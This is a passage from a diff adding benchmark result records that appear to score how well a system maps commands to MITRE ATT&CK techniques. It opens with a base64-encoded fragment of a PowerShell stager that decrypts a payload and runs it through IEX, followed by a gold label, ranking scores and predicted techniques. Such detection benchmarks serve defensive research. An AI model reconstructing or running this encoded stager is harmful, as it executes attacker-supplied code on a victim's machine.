AkAHQAKQA7ACQAaQBWAD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABEAEEAdABBAFsANAAuAC4AJABEAEEAdABhAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAEkATgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",
+      "kind": "technique",
+      "gold": [
+        "T1569.002"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 19,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1059.001",
+        "T1059.003",
+        "T1218.014",
+        "T1546.007",
+        "T1546.013"
+      ]
+    }
+  ]
+}
